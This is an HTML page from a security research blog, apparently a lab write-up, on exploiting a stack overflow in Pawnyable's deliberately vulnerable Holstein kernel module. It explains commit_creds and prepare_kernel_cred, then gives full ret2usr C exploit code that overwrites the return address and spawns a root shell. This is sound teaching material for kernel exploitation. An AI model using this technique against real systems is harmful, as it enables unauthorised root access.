@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] KBOF · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Please let me know if there are any mistakes. We will check and correct it. ※ Holstein https://">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/kernel-kbof/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-kbof/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-kbof/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] KBOF · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Please let me know if there are any mistakes. We will check and correct it. ※ Holstein https://"><meta property="og:url" content="https://whrds.github.io/en/posts/kernel-kbof/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] KBOF","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Please let me know if there are any mistakes. We will check and correct it. ※ Holstein https://","datePublished":"2024-06-27","inLanguage":"en","url":"https://whrds.github.io/en/posts/kernel-kbof/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/kernel-kbof/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] KBOF</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Please let me know if there are any mistakes. We will check and correct it. ※ Holstein https://</p><div class="article-meta"><time datetime="2024-06-27">Jun 27, 2024</time><span>·</span><span>4 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong> </p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a></p>
+<p> [[KERNEL] Holstein Module</p>
+<p>※ If there are any mistakes, please let me know. We will check and correct it. ※ ​Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting ​[KERNEL] Environment Setting※ ​Please let me know if there are any mistakes.</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a>)</p>
+<p>In the previous post, we used the Holstein module to analyze code and check vulnerabilities. </p>
+<p>We will try to exploit the fact that RIP can be manipulated through a vulnerability.</p>
+<h4>commit_creds()</h4>
+<hr>
+<p>The cred structure contains permission information for the process. And this is managed in a structure called task_cred.</p>
+<pre><code>int commit_creds(struct cred *new)
+{
+	struct task_struct *task = current;
+	const struct cred *old = task-&gt;real_cred;
+
+	kdebug(&quot;commit_creds(%p{%ld})&quot;, new,
+	       atomic_long_read(&amp;new-&gt;usage));
+
+	BUG_ON(task-&gt;cred != old);
+	BUG_ON(atomic_long_read(&amp;new-&gt;usage) &lt; 1);
+
+	get_cred(new); /* we will require a ref for the subj creds too */
+
+	/* dumpability changes */
+	if (!uid_eq(old-&gt;euid, new-&gt;euid) ||
+	    !gid_eq(old-&gt;egid, new-&gt;egid) ||
+	    !uid_eq(old-&gt;fsuid, new-&gt;fsuid) ||
+	    !gid_eq(old-&gt;fsgid, new-&gt;fsgid) ||
+	    !cred_cap_issubset(old, new)) {
+		if (task-&gt;mm)
+			set_dumpable(task-&gt;mm, suid_dumpable);
+		task-&gt;pdeath_signal = 0;
+		/*
+		 * If a task drops privileges and becomes nondumpable,
+		 * the dumpability change must become visible before
+		 * the credential change; otherwise, a __ptrace_may_access()
+		 * racing with this change may be able to attach to a task it
+		 * shouldn't be able to attach to (as if the task had dropped
+		 * privileges without becoming nondumpable).
+		 * Pairs with a read barrier in __ptrace_may_access().
+		 */
+		smp_wmb();
+	}
+
+	/* alter the thread keyring */
+	if (!uid_eq(new-&gt;fsuid, old-&gt;fsuid))
+		key_fsuid_changed(new);
+	if (!gid_eq(new-&gt;fsgid, old-&gt;fsgid))
+		key_fsgid_changed(new);
+
+	/* do it
+	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked
+	 * in set_user().
+	 */
+	if (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)
+		inc_rlimit_ucounts(new-&gt;ucounts, UCOUNT_RLIMIT_NPROC, 1);
+	rcu_assign_pointer(task-&gt;real_cred, new);
+	rcu_assign_pointer(task-&gt;cred, new);
+	if (new-&gt;user != old-&gt;user || new-&gt;user_ns != old-&gt;user_ns)
+		dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, 1);
+...
+</code></pre>
+<p>commit_creds() receives the new cred structure as an argument. It then plays the role of setting each permission information of the process as information in the new cred structure.</p>
+<h4>init_cred</h4>
+<hr>
+<pre><code>struct cred init_cred = {
+	.usage			= ATOMIC_INIT(4),
+	.uid			= GLOBAL_ROOT_UID,
+	.gid			= GLOBAL_ROOT_GID,
+	.suid			= GLOBAL_ROOT_UID,
+	.sgid			= GLOBAL_ROOT_GID,
+	.euid			= GLOBAL_ROOT_UID,
+	.egid			= GLOBAL_ROOT_GID,
+	.fsuid			= GLOBAL_ROOT_UID,
+	.fsgid			= GLOBAL_ROOT_GID,
+	.securebits		= SECUREBITS_DEFAULT,
+	.cap_inheritable	= CAP_EMPTY_SET,
+	.cap_permitted		= CAP_FULL_SET,
+	.cap_effective		= CAP_FULL_SET,
+	.cap_bset		= CAP_FULL_SET,
+	.user			= INIT_USER,
+	.user_ns		= &amp;init_user_ns,
+	.group_info		= &amp;init_groups,
+	.ucounts		= &amp;init_ucounts,
+};
+</code></pre>
+<p>If you look at init_cred in the cred structure, values including uid, gid, etc. indicate ROOT authority.</p>
+<p>If you have confirmed up to this point, you can change the process’s permission information to root by passing the init_cred structure as an argument to commit_creds().</p>
+<h4>prepare_kernel_cred</h4>
+<hr>
+<pre><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)
+{
+	const struct cred *old;
+	struct cred *new;
+
+	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
+	if (!new)
+		return NULL;
+
+	kdebug(&quot;prepare_kernel_cred() alloc %p&quot;, new);
+
+	if (daemon)
+		old = get_task_cred(daemon);
+	else
+		old = get_cred(&amp;init_cred);
+
+	validate_creds(old);
+...
+</code></pre>
+<p>In versions prior to linux kernel 6.2, if the argument to prepare_kernel_cred() is NULL, the init_cred structure is returned. </p>
+<p>In the previous post, we discussed modifying the RIP, but if we enter the code below into the RIP location, we will be elevated to the root user rather than a regular user.</p>
+<pre><code>commit_cred(prepare_kernel_cred(NULL))
+</code></pre>
+<h4>ret2usr</h4>
+<hr>
+<p>What we have confirmed so far operates in the kernel area. If you succeed in overwriting with the desired value, you must return to the user area.</p>
+<p><strong>swapgs</strong></p>
+<p>Use the swapgs command of the Intel architecture.  When moving from kernel mode to user mode, GS Segment is set differently. Therefore, before returning from the kernel area to the user area, you must use the corresponding command to set the GS Segment.</p>
+<p><strong>iretq</strong></p>
+<p>This command is used when moving from kernel area to user area.</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/001.png" alt=""></p>
+<p>To summarize again, the code below is executed in the kernel area.</p>
+<pre><code>commit_cred(prepare_kernel_cred(NULL))
+</code></pre>
+<p>Afterwards, you must set the GS Segment with swapgs and then return to the user area with iretq.</p>
+<p>This is a basic script for this.</p>
+<pre><code>static void win() {
+ char *argv[] = { &quot;/bin/sh&quot;, NULL };
+ char *envp[] = { NULL };
+ puts(&quot;[+] win!&quot;);
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+
+static void save_state() {
+ asm(
+      &quot;movq %%cs, %0\n&quot;
+      &quot;movq %%ss, %1\n&quot;
+      &quot;movq %%rsp, %2\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+static void restore_state() {
+  asm volatile(&quot;swapgs ;&quot;
+               &quot;movq %0, 0x20(%%rsp)\t\n&quot;
+               &quot;movq %1, 0x18(%%rsp)\t\n&quot;
+               &quot;movq %2, 0x10(%%rsp)\t\n&quot;
+               &quot;movq %3, 0x08(%%rsp)\t\n&quot;
+               &quot;movq %4, 0x00(%%rsp)\t\n&quot;
+               &quot;iretq&quot;
+               :
+               : &quot;r&quot;(user_ss),
+ &quot;r&quot;(user_rsp),
+ &quot;r&quot;(user_rflags),
+ &quot;r&quot;(user_cs), &quot;r&quot;(win));
+}
+</code></pre>
+<p>If you look at the code, you can see that there is win() for the shell.</p>
+<p>Even if the privilege itself is elevated from a regular user to root, the shell does not immediately take notice. Since this literally means that the execution permission of the process has been changed to root, you need to set a function to run /bin/sh in the code for the shell.</p>
+<h4>Exploit</h4>
+<hr>
+<p>In order to exploit, the offset between buf and ret must be obtained, similar to BoF in the user area.</p>
+<p>Use the ./root/vuln.ko file to find the offset of the vulnerable function _copy_from_user.</p>
+<p>.</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/002.png" alt=""></p>
+<p>I confirmed that the offset was 0x190.</p>
+<p>Now let’s connect to the kernel and find the base address. </p>
+<p>You can easily obtain the base address by entering the command below.</p>
+<pre><code>cat /proc/moduls
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/003.png" alt=""></p>
+<p>Run gdb and connect to the kernel as shown below.</p>
+<pre><code>target remote localhost:12345
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/004.png" alt=""></p>
+<p>[ To connect, you must add gdb tcp settings to <a href="http://run.sh">run.sh</a>. - Covered in previous post.]</p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting">https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting</a> </p>
+<p> [[KERNEL] Environment Setting</p>
+<p>※ If there are any mistakes, please let me know. We will check and correct it. ※ <a href="https://lrl.kr/JT5m">https://lrl.kr/JT5m</a> カーネルexploitへの導入 | PAWNYABLE! It’s time to explode!</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting">https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting</a>)</p>
+<p>The kernel executes the binary that generates the previously created segment fault.</p>
+<p>[I modified the code from 0x500 to 0x400 and proceeded]</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/005.png" alt=""></p>
+<p>Before calling _copy_from_user()</p>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/006.png" alt=""></p>
+<p>After calling _copy_from_user()</p>
+<p>You can see that the values up to 0x10 after rbp and ret are covered.</p>
+<p>The offset of buf - ret is 0x408.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+unsigned long prepare_kernel_cred = 0xffffffff8106e240;
+unsigned long commit_creds = 0xffffffff8106e390;
+
+static void win() {
+        char *argv[] = { &quot;/bin/sh&quot;, NULL };
+        char *evnp[] = { NULL };
+        puts(&quot;[+] win!&quot;);
+        execve(&quot;/bin/sh&quot;, argv, evnp);
+}
+
+static void save_state() {
+        asm(
+            &quot;movq %%cs, %0\n&quot;
+            &quot;movq %%ss, %1\n&quot;
+            &quot;movq %%rsp, %2\n&quot;
+            &quot;pushfq\n&quot;
+            &quot;popq %3\n&quot;
+            : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags
+)
+	  :
+      : &quot;memory&quot;);
+}
+
+static void restore_state() {
+  asm volatile(&quot;swapgs ;&quot;
+               &quot;movq %0, 0x20(%%rsp)\t\n&quot;
+               &quot;movq %1, 0x18(%%rsp)\t\n&quot;
+               &quot;movq %2, 0x10(%%rsp)\t\n&quot;
+               &quot;movq %3, 0x08(%%rsp)\t\n&quot;
+               &quot;movq %4, 0x00(%%rsp)\t\n&quot;
+               &quot;iretq&quot;
+               :
+               : &quot;r&quot;(user_ss),
+ &quot;r&quot;(user_rsp),
+ &quot;r&quot;(user_rflags),
+ &quot;r&quot;(user_cs), &quot;r&quot;(win));
+}
+
+static void escalate_privilege() {
+        char* (*pkc)(int) = (void*)(prepare_kernel_cred);
+        void (*cc)(char*) = (void*)(commit_creds);
+        (*cc)((*pkc)(0));
+        restore_state();
+}
+
+int main() {
+    save_state();
+    int fd = open(&quot;/dev/holstein&quot;, 2);
+
+    char buf[0x410];
+    memset(buf, 'A', 0x410);
+    *(unsigned long*)&amp;buf[0x408] = (unsigned long)&amp;escalate_privilege;
+    write(fd, buf, 0x410);
+
+    close(fd);
+    return 0;
+}
+</code></pre>
+<p>This is the final exploit code that adds a value to the ret location in main() to enable privilege elevation.</p>
+<p>To check the results, I will set the part that was set with root authority back to 1337 and proceed.</p>
+<p>Just edit the ./root/etc/init.d file.</p>
+<pre><code>#!/bin/sh
+
+##
+## Setup
+##
+mdev -s
+mount -t proc none /proc
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+stty -opost
+#echo 2 &gt; /proc/sys/kernel/kptr_restrict
+#echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+
+##
+## Install driver
+##
+insmod /root/vuln.ko
+mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
+
+##
+## User shell
+##
+echo -e &quot;\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n&quot;
+echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot;
+setsid cttyhack setuidgid 1337 sh
+
+##
+## Cleanup
+##
+umount /proc
+poweroff -d 0 -f
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-9743f1296bfa/007.png" alt=""></p>
+<p>After successfully elevating privileges, you can see that a shell has been obtained.</p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/kernel-kbof/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
